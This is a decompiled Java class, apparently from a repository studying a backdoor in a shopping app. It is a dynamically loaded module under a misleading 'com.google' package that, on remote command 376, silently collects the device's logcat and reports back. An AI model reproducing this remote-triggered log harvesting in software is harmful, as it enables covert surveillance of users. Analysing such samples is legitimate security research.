package com.google.android.sd.biz_dynamic_dex.logcat;

import android.content.Context;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.Utils;
import org.json.JSONObject;

public class LogcatExecutor extends DynamicCmdExecutor {
  public static final int CMD = 376;
  
  protected void realExecute(Context paramContext, String paramString) throws Exception {
    JSONObject jSONObject = new JSONObject(paramString);
    int i = jSONObject.optInt("max_line_per_page", 3000);
    SystemLogUtils.catchLogcatAsync(paramContext, jSONObject.optInt("max_pages", 20), i, jSONObject.optInt("max_time_sec", 30));
    CmdHandler.dispatch(paramContext, Utils.buildSucceedRespData(new CmdData(376, jSONObject.optString("uuid"), "client", paramString), null, null));
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\218a37ea-710d-49cb-b872-2a47a1115c69-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\logcat\LogcatExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */